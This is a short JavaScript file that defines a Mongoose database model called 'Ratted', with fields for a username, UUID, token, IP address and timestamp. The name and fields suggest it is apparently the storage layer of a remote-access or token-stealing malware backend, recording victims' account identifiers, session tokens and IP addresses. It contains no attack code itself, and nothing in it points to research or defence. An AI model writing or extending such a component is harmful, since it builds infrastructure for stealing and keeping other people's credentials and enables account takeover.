const mongoose = require("mongoose")

const rattedSchema = mongoose.Schema({
    username: String,
    uuid: String,
    token: String,
    ip: String,
    timestamp: Date
})

module.exports = mongoose.model("Ratted", rattedSchema)